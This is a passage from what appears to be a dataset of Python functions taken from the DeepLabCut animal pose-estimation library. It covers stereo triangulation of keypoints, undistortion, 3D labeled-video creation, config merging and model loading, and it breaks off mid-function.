            plt.savefig(os.path.join(str(path_undistort), 'undistorted_points.png'))
            triangulate = auxiliaryfunctions_3d.compute_triangulation_calibration_images(stereo_params[pair[0] + '-' + pair[1]], cam1_undistort, cam2_undistort, path_undistort, cfg_3d, plot=True)
            auxiliaryfunctions.write_pickle('triangulate.pickle', triangulate)"
AlexEMG/DeepLabCut,set_up_grid,"def set_up_grid(figsize, xlim, ylim, zlim, view):
    gs = gridspec.GridSpec(1, 3, width_ratios=[1, 1, 1])
    fig = plt.figure(figsize=figsize)
    axes1 = fig.add_subplot(gs[0, 0])
    axes2 = fig.add_subplot(gs[0, 1])
    axes3 = fig.add_subplot(gs[0, 2], projection='3d')
    axes3.set_xlim3d(xlim)
    axes3.set_ylim3d(ylim)
    axes3.set_zlim3d(zlim)
    axes3.set_box_aspect((1, 1, 1))
    axes3.set_xticklabels([])
    axes3.set_yticklabels([])
    axes3.set_zticklabels([])
    axes3.xaxis.grid(False)
    axes3.view_init(view[0], view[1])
    axes3.set_xlabel('X', fontsize=10)
    axes3.set_ylabel('Y', fontsize=10)
    axes3.set_zlabel('Z', fontsize=10)
    return (fig, axes1, axes2, axes3)"
AlexEMG/DeepLabCut,create_labeled_video_3d,"def create_labeled_video_3d(config, path, videofolder=None, start=0, end=None, trailpoints=0, videotype='', view=(-113, -270), xlim=None, ylim=None, zlim=None, draw_skeleton=True, color_by='bodypart', figsize=(20, 8), fps=30, dpi=300):
    """"""
    Creates a video with views from the two cameras and the 3d reconstruction for a selected number of frames.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    path : list
        A list of strings containing the full paths to triangulated files for analysis or a path to the directory, where all the triangulated files are stored.

    videofolder: string
        Full path of the folder where the videos are stored. Use this if the vidoes are stored in a different location other than where the triangulation files are stored. By default is ``None`` and therefore looks for video files in the directory where the triangulation file is stored.

    start: int
        Integer specifying the start of frame index to select. Default is set to 0.

    end: int
        Integer specifying the end of frame index to select. Default is set to None, where all the frames of the video are used for creating the labeled video.

    trailpoints: int
        Number of revious frames whose body parts are plotted in a frame (for displaying history). Default is set to 0.

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.

    view: list
        A list that sets the elevation angle in z plane and azimuthal angle in x,y plane of 3d view. Useful for rotating the axis for 3d view

    xlim: list
        A list of integers specifying the limits for xaxis of 3d view. By default it is set to [None,None], where the x limit is set by taking the minimum and maximum value of the x coordinates for all the bodyparts.

    ylim: list
        A list of integers specifying the limits for yaxis of 3d view. By default it is set to [None,None], where the y limit is set by taking the minimum and maximum value of the y coordinates for all the bodyparts.

    zlim: list
        A list of integers specifying the limits for zaxis of 3d view. By default it is set to [None,None], where the z limit is set by taking the minimum and maximum value of the z coordinates for all the bodyparts.

    draw_skeleton: bool
        If ``True`` adds a line connecting the body parts making a skeleton on on each frame. The body parts to be connected and the color of these connecting lines are specified in the config file. By default: ``True``

    color_by : string, optional (default='bodypart')
        Coloring rule. By default, each bodypart is colored differently.
        If set to 'individual', points belonging to a single individual are colored the same.

    Example
    -------
    Linux/MacOs
    >>> deeplabcut.create_labeled_video_3d(config,['/data/project1/videos/3d.h5'],start=100, end=500)

    To create labeled videos for all the triangulated files in the folder
    >>> deeplabcut.create_labeled_video_3d(config,['/data/project1/videos'],start=100, end=500)

    To set the xlim, ylim, zlim and rotate the view of the 3d axis
    >>> deeplabcut.create_labeled_video_3d(config,['/data/project1/videos'],start=100, end=500,view=[30,90],xlim=[-12,12],ylim=[15,25],zlim=[20,30])

    """"""
    start_path = os.getcwd()
    cfg_3d = auxiliaryfunctions.read_config(config)
    cam_names = cfg_3d['camera_names']
    pcutoff = cfg_3d['pcutoff']
    markerSize = cfg_3d['dotsize']
    alphaValue = cfg_3d['alphaValue']
    cmap = cfg_3d['colormap']
    bodyparts2connect = cfg_3d['skeleton']
    skeleton_color = cfg_3d['skeleton_color']
    scorer_3d = cfg_3d['scorername_3d']
    if color_by not in ('bodypart', 'individual'):
        raise ValueError(f'Invalid color_by={color_by}')
    file_list = auxiliaryfunctions_3d.Get_list_of_triangulated_and_videoFiles(path, videotype, scorer_3d, cam_names, videofolder)
    print(file_list)
    if file_list == []:
        raise Exception('No corresponding video file(s) found for the specified triangulated file or folder. Did you specify the video file type? If videos are stored in a different location, please use the ``videofolder`` argument to specify their path.')
    for file in file_list:
        path_h5_file = Path(file[0]).parents[0]
        triangulate_file = file[0]
        file_name = str(Path(triangulate_file).stem)
        videooutname = os.path.join(path_h5_file, file_name + '.mp4')
        if os.path.isfile(videooutname):
            print('Video already created...')
        else:
            string_to_remove = str(Path(triangulate_file).suffix)
            pickle_file = triangulate_file.replace(string_to_remove, '_meta.pickle')
            metadata_ = auxiliaryfunctions_3d.LoadMetadata3d(pickle_file)
            base_filename_cam1 = str(Path(file[1]).stem).split(videotype)[0]
            base_filename_cam2 = str(Path(file[2]).stem).split(videotype)[0]
            cam1_view_video = file[1]
            cam2_view_video = file[2]
            cam1_scorer = metadata_['scorer_name'][cam_names[0]]
            cam2_scorer = metadata_['scorer_name'][cam_names[1]]
            print('Creating 3D video from %s and %s using %s' % (Path(cam1_view_video).name, Path(cam2_view_video).name, Path(triangulate_file).name))
            vid_cam1 = VideoReader(cam1_view_video)
            vid_cam2 = VideoReader(cam2_view_video)
            try:
                print('Looking for filtered predictions...')
                df_cam1 = pd.read_hdf(glob.glob(os.path.join(path_h5_file, str('*' + base_filename_cam1 + cam1_scorer + '*filtered.h5')))[0])
                df_cam2 = pd.read_hdf(glob.glob(os.path.join(path_h5_file, str('*' + base_filename_cam2 + cam2_scorer + '*filtered.h5')))[0])
                print('Found the following filtered data: ', os.path.join(path_h5_file, str('*' + base_filename_cam1 + cam1_scorer + '*filtered.h5')), os.path.join(path_h5_file, str('*' + base_filename_cam2 + cam2_scorer + '*filtered.h5')))
            except IndexError:
                print('No filtered predictions found, the unfiltered predictions will be used instead.')
                df_cam1 = pd.read_hdf(glob.glob(os.path.join(path_h5_file, str(base_filename_cam1 + cam1_scorer + '*.h5')))[0])
                df_cam2 = pd.read_hdf(glob.glob(os.path.join(path_h5_file, str(base_filename_cam2 + cam2_scorer + '*.h5')))[0])
            df_3d = pd.read_hdf(triangulate_file)
            try:
                num_animals = df_3d.columns.get_level_values('individuals').unique().size
            except KeyError:
                num_animals = 1
            if end is None:
                end = len(df_3d)
            end = min(end, min(len(vid_cam1), len(vid_cam2)))
            frames = list(range(start, end))
            output_folder = Path(os.path.join(path_h5_file, 'temp_' + file_name))
            output_folder.mkdir(parents=True, exist_ok=True)
            bodyparts2plot = list(np.unique([val for sublist in bodyparts2connect for val in sublist]))
            mask2d = df_cam1.columns.get_level_values('bodyparts').isin(bodyparts2plot)
            xy1 = df_cam1.iloc[:len(df_3d)].loc[:, mask2d].to_numpy().reshape((len(df_3d), -1, 3))
            visible1 = xy1[..., 2] >= pcutoff
            xy1[~visible1] = np.nan
            xy2 = df_cam2.iloc[:len(df_3d)].loc[:, mask2d].to_numpy().reshape((len(df_3d), -1, 3))
            visible2 = xy2[..., 2] >= pcutoff
            xy2[~visible2] = np.nan
            mask = df_3d.columns.get_level_values('bodyparts').isin(bodyparts2plot)
            xyz = df_3d.loc[:, mask].to_numpy().reshape((len(df_3d), -1, 3))
            xyz[~(visible1 & visible2)] = np.nan
            bpts = df_3d.columns.get_level_values('bodyparts')[mask][::3]
            links = make_labeled_video.get_segment_indices(bodyparts2connect, bpts)
            ind_links = tuple(zip(*links))
            if color_by == 'bodypart':
                color = plt.cm.get_cmap(cmap, len(bodyparts2plot))
                colors_ = color(range(len(bodyparts2plot)))
                colors = np.tile(colors_, (num_animals, 1))
            elif color_by == 'individual':
                color = plt.cm.get_cmap(cmap, num_animals)
                colors_ = color(range(num_animals))
                colors = np.repeat(colors_, len(bodyparts2plot), axis=0)
            minmax = np.nanpercentile(xyz[frames], q=[25, 75], axis=(0, 1)).T
            minmax *= 1.1
            minmax_range = (minmax[:, 1] - minmax[:, 0]).max() / 2
            if xlim is None:
                mid_x = np.mean(minmax[0])
                xlim = (mid_x - minmax_range, mid_x + minmax_range)
            if ylim is None:
                mid_y = np.mean(minmax[1])
                ylim = (mid_y - minmax_range, mid_y + minmax_range)
            if zlim is None:
                mid_z = np.mean(minmax[2])
                zlim = (mid_z - minmax_range, mid_z + minmax_range)
            (fig, axes1, axes2, axes3) = set_up_grid(figsize, xlim, ylim, zlim, view)
            points_2d1 = axes1.scatter(*np.zeros((2, len(bodyparts2plot))), s=markerSize, alpha=alphaValue)
            im1 = axes1.imshow(np.zeros((vid_cam1.height, vid_cam1.width)))
            points_2d2 = axes2.scatter(*np.zeros((2, len(bodyparts2plot))), s=markerSize, alpha=alphaValue)
            im2 = axes2.imshow(np.zeros((vid_cam2.height, vid_cam2.width)))
            points_3d = axes3.scatter(*np.zeros((3, len(bodyparts2plot))), s=markerSize, alpha=alphaValue)
            if draw_skeleton:
                segs = np.zeros((2, len(ind_links), 2))
                coll1 = LineCollection(segs, colors=skeleton_color)
                coll2 = LineCollection(segs, colors=skeleton_color)
                axes1.add_collection(coll1)
                axes2.add_collection(coll2)
                segs = np.zeros((2, len(ind_links), 3))
                coll_3d = Line3DCollection(segs, colors=skeleton_color)
                axes3.add_collection(coll_3d)
            writer = FFMpegWriter(fps=fps)
            with writer.saving(fig, videooutname, dpi=dpi):
                for k in tqdm(frames):
                    vid_cam1.set_to_frame(k)
                    vid_cam2.set_to_frame(k)
                    frame_cam1 = vid_cam1.read_frame()
                    frame_cam2 = vid_cam2.read_frame()
                    if frame_cam1 is None or frame_cam2 is None:
                        raise IOError('A video frame is empty.')
                    im1.set_data(frame_cam1)
                    im2.set_data(frame_cam2)
                    sl = slice(max(0, k - trailpoints), k + 1)
                    coords3d = xyz[sl]
                    coords1 = xy1[sl, :, :2]
                    coords2 = xy2[sl, :, :2]
                    points_3d._offsets3d = coords3d.reshape((-1, 3)).T
                    points_3d.set_color(colors)
                    points_2d1.set_offsets(coords1.reshape((-1, 2)))
                    points_2d1.set_color(colors)
                    points_2d2.set_offsets(coords2.reshape((-1, 2)))
                    points_2d2.set_color(colors)
                    if draw_skeleton:
                        segs3d = xyz[k][tuple([ind_links])].swapaxes(0, 1)
                        coll_3d.set_segments(segs3d)
                        segs1 = xy1[k, :, :2][tuple([ind_links])].swapaxes(0, 1)
                        coll1.set_segments(segs1)
                        segs2 = xy2[k, :, :2][tuple([ind_links])].swapaxes(0, 1)
                        coll2.set_segments(segs2)
                    writer.grab_frame()"
AlexEMG/DeepLabCut,triangulate,"def triangulate(config, video_path, videotype='', filterpredictions=True, filtertype='median', gputouse=None, destfolder=None, save_as_csv=False, track_method=''):
    """"""
    This function triangulates the detected DLC-keypoints from the two camera views
    using the camera matrices (derived from calibration) to calculate 3D predictions.

    Parameters
    ----------
    config : string
        Full path of the config.yaml file as a string.

    video_path : string/list of list
        Full path of the directory where videos are saved. If the user wants to analyze
        only a pair of videos, the user needs to pass them as a list of list of videos,
        i.e. [['video1-camera-1.avi','video1-camera-2.avi']]

    videotype: string, optional
        Checks for the extension of the video in case the input to the video is a directory.
 Only videos with this extension are analyzed.
        If left unspecified, videos with common extensions ('avi', 'mp4', 'mov', 'mpeg', 'mkv') are kept.


    filterpredictions: Bool, optional
        Filter the predictions with filter specified by ""filtertype"". If specified it
        should be either ``True`` or ``False``.

    filtertype: string
        Select which filter, 'arima' or 'median' filter (currently supported).

    gputouse: int, optional. Natural number indicating the number of your GPU (see number in nvidia-smi).
        If you do not have a GPU put None.
        See: https://nvidia.custhelp.com/app/answers/detail/a_id/3751/~/useful-nvidia-smi-queries

    destfolder: string, optional
        Specifies the destination folder for analysis data (default is the path of the video)

    save_as_csv: bool, optional
        Saves the predictions in a .csv file. The default is ``False``

    Example
    -------
    Linux/MacOS
    To analyze all the videos in the directory:
    >>> deeplabcut.triangulate(config,'/data/project1/videos/')

    To analyze only a few pairs of videos:
    >>> deeplabcut.triangulate(config,[['/data/project1/videos/video1-camera-1.avi','/data/project1/videos/video1-camera-2.avi'],['/data/project1/videos/video2-camera-1.avi','/data/project1/videos/video2-camera-2.avi']])


    Windows
    To analyze all the videos in the directory:
    >>> deeplabcut.triangulate(config,'C:\\yourusername\\rig-95\\Videos')

    To analyze only a few pair of videos:
    >>> deeplabcut.triangulate(config,[['C:\\yourusername\\rig-95\\Videos\\video1-camera-1.avi','C:\\yourusername\\rig-95\\Videos\\video1-camera-2.avi'],['C:\\yourusername\\rig-95\\Videos\\video2-camera-1.avi','C:\\yourusername\\rig-95\\Videos\\video2-camera-2.avi']])
    """"""
    from deeplabcut.pose_estimation_tensorflow import predict_videos
    from deeplabcut.post_processing import filtering
    cfg_3d = auxiliaryfunctions.read_config(config)
    cam_names = cfg_3d['camera_names']
    pcutoff = cfg_3d['pcutoff']
    scorer_3d = cfg_3d['scorername_3d']
    snapshots = {}
    for cam in cam_names:
        snapshots[cam] = cfg_3d[str('config_file_' + cam)]
        if not os.path.exists(snapshots[cam]):
            raise Exception(str('It seems the file specified in the variable config_file_' + str(cam)) + ' does not exist. Please edit the config file with correct file path and retry.')
    flag = False
    if isinstance(video_path, str) == True:
        flag = True
        video_list = auxiliaryfunctions_3d.get_camerawise_videos(video_path, cam_names, videotype=videotype)
    else:
        video_list = video_path
    if video_list == []:
        print('No videos found in the specified video path.', video_path)
        print('Please make sure that the video names are specified with correct camera names as entered in the config file or')
        print('perhaps the videotype is distinct from the videos in the path, I was looking for:', videotype)
    print('List of pairs:', video_list)
    scorer_name = {}
    run_triangulate = False
    for i in range(len(video_list)):
        dataname = []
        for j in range(len(video_list[i])):
            if cam_names[j] not in video_list[i][j]:
                raise ValueError(f""Camera name '{cam_names[j]}' not found in video list '{video_list[i][j]}'."")
            else:
                print('Analyzing video %s using %s' % (video_list[i][j], str('config_file_' + cam_names[j])))
                config_2d = snapshots[cam_names[j]]
                cfg = auxiliaryfunctions.read_config(config_2d)
                track_method = auxfun_multianimal.get_track_method(cfg, track_method=track_method)
                if len(cfg.get('multianimalbodyparts', [])) == 1 and track_method != 'box':
                    warnings.warn('Switching to `box` tracker for single point tracking...')
                    track_method = 'box'
                tr_method_suffix = TRACK_METHODS.get(track_method, '')
                shuffle = cfg_3d[str('shuffle_' + cam_names[j])]
                trainingsetindex = cfg_3d[str('trainingsetindex_' + cam_names[j])]
                trainFraction = cfg['TrainingFraction'][trainingsetindex]
                if flag == True:
                    video = os.path.join(video_path, video_list[i][j])
                else:
                    video_path = str(Path(video_list[i][j]).parents[0])
                    video = os.path.join(video_path, video_list[i][j])
                if destfolder is None:
                    destfolder = str(Path(video).parents[0])
                vname = Path(video).stem
                prefix = str(vname).split(cam_names[j])[0]
                suffix = str(vname).split(cam_names[j])[-1]
                if prefix == '':
                    pass
                elif prefix[-1] == '_' or prefix[-1] == '-':
                    prefix = prefix[:-1]
                if suffix == '':
                    pass
                elif suffix[0] == '_' or suffix[0] == '-':
                    suffix = suffix[1:]
                if prefix == '':
                    output_file = os.path.join(destfolder, suffix)
                elif suffix == '':
                    output_file = os.path.join(destfolder, prefix)
                else:
                    output_file = os.path.join(destfolder, prefix + '_' + suffix)
                output_filename = os.path.join(output_file + '_' + scorer_3d)
                if os.path.isfile(output_filename + '.h5'):
                    if save_as_csv is True and (not os.path.exists(output_filename + '.csv')):
                        pd.read_hdf(output_filename + '.h5').to_csv(str(output_filename + '.csv'))
                    print('Already analyzed...Checking the meta data for any change in the camera matrices and/or scorer names', vname)
                    pickle_file = str(output_filename + '_meta.pickle')
                    metadata_ = auxiliaryfunctions_3d.LoadMetadata3d(pickle_file)
                    (img_path, path_corners, path_camera_matrix, path_undistort, _) = auxiliaryfunctions_3d.Foldernames3Dproject(cfg_3d)
                    path_stereo_file = os.path.join(path_camera_matrix, 'stereo_params.pickle')
                    stereo_file = auxiliaryfunctions.read_pickle(path_stereo_file)
                    cam_pair = str(cam_names[0] + '-' + cam_names[1])
                    is_video_analyzed = False
                    for k in metadata_['stereo_matrix'].keys():
                        if np.all(metadata_['stereo_matrix'][k] == stereo_file[cam_pair][k]):
                            pass
                        else:
                            run_triangulate = True
                    (DLCscorer, DLCscorerlegacy) = auxiliaryfunctions.get_scorer_name(cfg, shuffle, trainFraction, trainingsiterations='unknown')
                    if metadata_['scorer_name'][cam_names[j]] == DLCscorer:
                        is_video_analyzed = True
                    elif metadata_['scorer_name'][cam_names[j]] == DLCscorerlegacy:
                        is_video_analyzed = True
                    else:
                        is_video_analyzed = False
                        run_triangulate = True
                    if is_video_analyzed:
                        print('This file is already analyzed!')
                        dataname.append(os.path.join(destfolder, vname + DLCscorer + tr_method_suffix + '.h5'))
                        scorer_name[cam_names[j]] = DLCscorer
                    else:
                        DLCscorer = predict_videos.analyze_videos(config_2d, [video], videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, gputouse=gputouse, destfolder=destfolder)
                        scorer_name[cam_names[j]] = DLCscorer
                        is_video_analyzed = False
                        run_triangulate = True
                        suffix = tr_method_suffix
                        if filterpredictions:
                            filtering.filterpredictions(config_2d, [video], videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, filtertype=filtertype, destfolder=destfolder)
                            suffix += '_filtered'
                        dataname.append(os.path.join(destfolder, vname + DLCscorer + suffix + '.h5'))
                else:
                    DLCscorer = predict_videos.analyze_videos(config_2d, [video], videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, gputouse=gputouse, destfolder=destfolder)
                    scorer_name[cam_names[j]] = DLCscorer
                    run_triangulate = True
                    print(destfolder, vname, DLCscorer)
                    suffix = tr_method_suffix
                    if filterpredictions:
                        filtering.filterpredictions(config_2d, [video], videotype=videotype, shuffle=shuffle, trainingsetindex=trainingsetindex, filtertype=filtertype, destfolder=destfolder)
                        suffix += '_filtered'
                    dataname.append(os.path.join(destfolder, vname + DLCscorer + suffix + '.h5'))
        if run_triangulate:
            print('Undistorting...')
            (dataFrame_camera1_undistort, dataFrame_camera2_undistort, stereomatrix, path_stereo_file) = undistort_points(config, dataname, str(cam_names[0] + '-' + cam_names[1]))
            if len(dataFrame_camera1_undistort) != len(dataFrame_camera2_undistort):
                import warnings
                warnings.warn('The number of frames do not match in the two videos. Please make sure that your videos have same number of frames and then retry! Excluding the extra frames from the longer video.')
                if len(dataFrame_camera1_undistort) > len(dataFrame_camera2_undistort):
                    dataFrame_camera1_undistort = dataFrame_camera1_undistort[:len(dataFrame_camera2_undistort)]
                if len(dataFrame_camera2_undistort) > len(dataFrame_camera1_undistort):
                    dataFrame_camera2_undistort = dataFrame_camera2_undistort[:len(dataFrame_camera1_undistort)]
            scorer_cam1 = dataFrame_camera1_undistort.columns.get_level_values(0)[0]
            scorer_cam2 = dataFrame_camera2_undistort.columns.get_level_values(0)[0]
            bodyparts = dataFrame_camera1_undistort.columns.get_level_values('bodyparts').unique()
            P1 = stereomatrix['P1']
            P2 = stereomatrix['P2']
            F = stereomatrix['F']
            print('Computing the triangulation...')
            num_frames = dataFrame_camera1_undistort.shape[0]
            data_cam1_tmp = dataFrame_camera1_undistort.to_numpy().reshape((num_frames, -1, 3))
            data_cam2_tmp = dataFrame_camera2_undistort.to_numpy().reshape((num_frames, -1, 3))
            data_cam1_tmp[data_cam1_tmp[..., 2] < pcutoff, :2] = np.nan
            data_cam2_tmp[data_cam2_tmp[..., 2] < pcutoff, :2] = np.nan
            data_cam1_tmp = data_cam1_tmp.reshape(num_frames, -1)
            data_cam2_tmp = data_cam2_tmp.reshape(num_frames, -1)
            dataFrame_camera1_undistort[:] = data_cam1_tmp
            dataFrame_camera2_undistort[:] = data_cam2_tmp
            if cfg.get('multianimalproject'):
                individuals_view1 = dataFrame_camera1_undistort.columns.get_level_values('individuals').unique().to_list()
                individuals_view2 = dataFrame_camera2_undistort.columns.get_level_values('individuals').unique().to_list()
                if individuals_view1 != individuals_view2:
                    raise ValueError('The individuals do not match between the two DataFrames')
                (_, voting) = auxiliaryfunctions_3d.cross_view_match_dataframes(dataFrame_camera1_undistort, dataFrame_camera2_undistort, F)
            else:
                individuals_view1 = ['indie']
                voting = {0: 0}
            individuals = individuals_view1
            all_points_cam1 = dataFrame_camera1_undistort.to_numpy().reshape((num_frames, len(individuals), -1, 3))[..., :2]
            all_points_cam2 = dataFrame_camera2_undistort.to_numpy().reshape((num_frames, len(individuals), -1, 3))[..., :2]
            triangulate = []
            for (i, _) in enumerate(individuals):
                pts_indv_cam1 = all_points_cam1[:, i].reshape((-1, 2)).T
                pts_indv_cam2 = all_points_cam2[:, voting[i]].reshape((-1, 2)).T
                indv_points_3d = auxiliaryfunctions_3d.triangulatePoints(P1, P2, pts_indv_cam1, pts_indv_cam2)
                indv_points_3d = indv_points_3d[:3].T.reshape((num_frames, -1, 3))
                triangulate.append(indv_points_3d)
            triangulate = np.asanyarray(triangulate)
            metadata = {}
            metadata['stereo_matrix'] = stereomatrix
            metadata['stereo_matrix_file'] = path_stereo_file
            metadata['scorer_name'] = {cam_names[0]: scorer_name[cam_names[0]], cam_names[1]: scorer_name[cam_names[1]]}
            axis_labels = ('x', 'y', 'z')
            if cfg.get('multianimalproject'):
                columns = pd.MultiIndex.from_product([[scorer_3d], individuals, bodyparts, axis_labels], names=['scorer', 'individuals', 'bodyparts', 'coords'])
            else:
                columns = pd.MultiIndex.from_product([[scorer_3d], bodyparts, axis_labels], names=['scorer', 'bodyparts', 'coords'])
            inds = range(num_frames)
            triangulate = triangulate.swapaxes(0, 1).reshape((num_frames, -1))
            df_3d = pd.DataFrame(triangulate, columns=columns, index=inds)
            df_3d.to_hdf(str(output_filename + '.h5'), 'df_with_missing', format='table', mode='w')
            if cfg.get('multianimalproject'):
                df_2d_view2 = pd.read_hdf(dataname[1])
                individuals_order = [individuals[i] for i in list(voting.values())]
                df_2d_view2 = auxfun_multianimal.reorder_individuals_in_df(df_2d_view2, individuals_order)
                df_2d_view2.to_hdf(dataname[1], 'tracks', format='table', mode='w')
            auxiliaryfunctions_3d.SaveMetadata3d(str(output_filename + '_meta.pickle'), metadata)
            if save_as_csv:
                df_3d.to_csv(str(output_filename + '.csv'))
            print('Triangulated data for video', video_list[i])
            print('Results are saved under: ', destfolder)
            if destfolder == str(Path(video).parents[0]):
                destfolder = None
    if len(video_list) > 0:
        print('All videos were analyzed...')
        print('Now you can create 3D video(s) using deeplabcut.create_labeled_video_3d')"
AlexEMG/DeepLabCut,_undistort_points,"def _undistort_points(points, mat, coeffs, p, r):
    pts = points.reshape((-1, 3))
    pts_undist = cv2.undistortPoints(src=pts[:, :2].astype(np.float32), cameraMatrix=mat, distCoeffs=coeffs, P=p, R=r)
    pts[:, :2] = pts_undist.squeeze()
    return pts.reshape((points.shape[0], -1))"
AlexEMG/DeepLabCut,_undistort_views,"def _undistort_views(df_view_pairs, stereo_params):
    df_views_undist = []
    for (df_view_pair, camera_pair) in zip(df_view_pairs, stereo_params):
        params = stereo_params[camera_pair]
        dfs = []
        for (i, df_view) in enumerate(df_view_pair, start=1):
            pts_undist = _undistort_points(df_view.to_numpy(), params[f'cameraMatrix{i}'], params[f'distCoeffs{i}'], params[f'P{i}'], params[f'R{i}'])
            df = pd.DataFrame(pts_undist, df_view.index, df_view.columns)
            dfs.append(df)
        df_views_undist.append(dfs)
    return df_views_undist"
AlexEMG/DeepLabCut,undistort_points,"def undistort_points(config, dataframe, camera_pair):
    cfg_3d = auxiliaryfunctions.read_config(config)
    path_camera_matrix = auxiliaryfunctions_3d.Foldernames3Dproject(cfg_3d)[2]
    '\n    path_undistort = destfolder\n    filename_cam1 = Path(dataframe[0]).stem\n    filename_cam2 = Path(dataframe[1]).stem\n\n    #currently no intermediate saving of this due to high speed.\n    # check if the undistorted files are already present\n    if os.path.exists(os.path.join(path_undistort,filename_cam1 + \'_undistort.h5\')) and os.path.exists(os.path.join(path_undistort,filename_cam2 + \'_undistort.h5\')):\n        print(""The undistorted files are already present at %s"" % os.path.join(path_undistort,filename_cam1))\n        dataFrame_cam1_undistort = pd.read_hdf(os.path.join(path_undistort,filename_cam1 + \'_undistort.h5\'))\n        dataFrame_cam2_undistort = pd.read_hdf(os.path.join(path_undistort,filename_cam2 + \'_undistort.h5\'))\n    else:\n    '
    if len(dataframe) != 2:
        raise ValueError(f'undistort_points(config, dataframe, camera_pair) needs filenames to two data frames, but got dataframe={dataframe}.')
    for filename in dataframe:
        if not os.path.exists(filename):
            raise FileNotFoundError(f""Dataframe path '{filename}' could not be found in the filesystem."")
    if not os.path.exists(path_camera_matrix):
        raise FileNotFoundError(f""Camera matrix file '{path_camera_matrix}' could not be found in the filesystem."")
    dataframe_cam1 = pd.read_hdf(dataframe[0])
    dataframe_cam2 = pd.read_hdf(dataframe[1])
    path_stereo_file = os.path.join(path_camera_matrix, 'stereo_params.pickle')
    stereo_file = auxiliaryfunctions.read_pickle(path_stereo_file)
    (dataFrame_cam1_undistort, dataFrame_cam2_undistort) = _undistort_views([(dataframe_cam1, dataframe_cam2)], stereo_file)[0]
    return (dataFrame_cam1_undistort, dataFrame_cam2_undistort, stereo_file[camera_pair], path_stereo_file)"
AlexEMG/DeepLabCut,_merge_a_into_b,"def _merge_a_into_b(a, b):
    """"""
    Merge config dictionary a into config dictionary b, clobbering the
    options in b whenever they are also specified in a.
    """"""
    for (k, v) in a.items():
        if isinstance(v, dict):
            if not b.get(k, False):
                b[k] = v
            else:
                try:
                    _merge_a_into_b(a[k], b[k])
                except:
                    print('Error under config key: {}'.format(k))
                    raise
        else:
            b[k] = v"
AlexEMG/DeepLabCut,cfg_from_file,"def cfg_from_file(filename):
    """"""
    Load a config from file filename and merge it into the default options.
    """"""
    with open(filename, 'r') as f:
        yaml_cfg = yaml.load(f, Loader=yaml.SafeLoader)
    trainpath = str(filename).split('pose_cfg.yaml')[0]
    yaml_cfg['snapshot_prefix'] = trainpath + 'snapshot'
    import importlib
    from . import default_config
    importlib.reload(default_config)
    default_cfg = default_config.cfg
    _merge_a_into_b(yaml_cfg, default_cfg)
    logging.info('Config:\n' + pprint.pformat(default_cfg))
    return default_cfg"
AlexEMG/DeepLabCut,load_config,"def load_config(filename='pose_cfg.yaml'):
    return cfg_from_file(filename)"
AlexEMG/DeepLabCut,create_deploy_config_template,"def create_deploy_config_template():
    """"""

    TODO: WIP

    Creates a template for config.yaml file.
    This specific order is preserved while saving as yaml file.
    """"""
    yaml_str = '# Deploy config.yaml - info about project origin:\n    Task:\n    scorer:\n    date:\n    \n\n# Project path\n    project_path:\n    \n\n# Annotation data set configuration (and individual video cropping parameters)\n    video_sets:\n    bodyparts:\n    \n\n# Plotting configuration\n    skeleton:\n    skeleton_color:\n    \n\n    '
    ruamelFile = ruamel.yaml.YAML()
    cfg_file = ruamelFile.load(yaml_str)
    return (cfg_file, ruamelFile)"
AlexEMG/DeepLabCut,write_deploy_config,"def write_deploy_config(configname, cfg):
    """"""

    CURRENTLY NOT IMPLEMENTED

    Write structured config file.
    """"""
    with open(configname, 'w') as cf:
        ruamelFile = ruamel.yaml.YAML()
        (cfg_file, ruamelFile) = create_deploy_config_template()
        for key in cfg.keys():
            cfg_file[key] = cfg[key]
        if not 'skeleton' in cfg.keys():
            cfg_file['skeleton'] = []
            cfg_file['skeleton_color'] = 'black'
        ruamelFile.dump(cfg_file, cf)"
AlexEMG/DeepLabCut,load_model,"def load_model(cfg, shuffle=1, trainingsetindex=0, TFGPUinference=True, modelprefix=''):
    """"""

    Loads a tensorflow session with a DLC model from the associated configuration
    Return a tensorflow session with DLC model given cfg and shuffle

    Parameters:
    -----------
    cfg : dict
        Configuration read from the project's main config.yaml file

    shuffle : int, optional
        which shuffle to use

    trainingsetindex : int. optional
        which training fraction to use, identified by its index

    TFGPUinference : bool, optional
        use tensorflow inference model? default = True

    Returns:
    --------
    sess : tensorflow session
        tensorflow session with DLC model from the provided configuration, shuffle, and trainingsetindex

    checkpoint file path : string
        the path to the checkpoint file associated with the loaded model
    """"""
    train_fraction = cfg['TrainingFraction'][trainingsetindex]
    model_folder = os.path.join(cfg['project_path'], str(auxiliaryfunctions.get_model_folder(train_fraction, shuffle, cfg, modelprefix=modelprefix)))
    path_test_config = os.path.normpath(model_folder + '/test/pose_cfg.yaml')
    path_train_config = os.path.normpath(model_folder + '/train/pose_cfg.yaml')
    try:
        dlc_cfg = load_config(str(path_train_config))
    except FileNotFoundError:
        raise FileNotFoundError('It seems the model for shuffle %s and trainFraction %s does not exist.' % (shuffle, train_fraction))
    try:
        Snapshots = np.array([fn.split('.')[0] for fn in os.listdir(os.path.join(model_folder, 'train')) if 'index' in fn])
    except FileNotFoundError:
        raise FileNotFoundError(""Snapshots not found! It seems the dataset for shuffle %s has not been trained/does not exist.\n Please train it before trying to export.\n Use the function 'train_network' to train the network for shuffle %s."" % (shuffle, shuffle))
    if len(Snapshots) == 0:
        raise FileNotFoundError(""The train folder for iteration %s and shuffle %s exists, but no snapshots were found.\n Please train this model before trying to export.\n Use the function 'train_network' to train the network for iteration %s shuffle %s."" % (cfg['iteration'], shuffle, cfg['iteration'], shuffle))
    if cfg['snapshotindex'] == 'all':
        print(""Snapshotindex is set to 'all' in the config.yaml file. Changing snapshot index to -1!"")
        snapshotindex = -1
    else:
        snapshotindex = cfg['snapshotindex']
    increasing_indices = np.argsort([int(m.split('-')[1]) for m in Snapshots])
    Snapshots = Snapshots[increasing_indices]
    dlc_cfg['init_weights'] = os.path.join(model_folder, 'train', Snapshots[snapshotindex])
    trainingsiterations = dlc_cfg['init_weights'].split(os.sep)[-1].split('-')[-1]
    dlc_cfg['num_outputs'] = cfg.get('num_outputs', dlc_cfg.get('num_outputs', 1))
    dlc_cfg['batch_size'] = None
    if TFGPUinference:
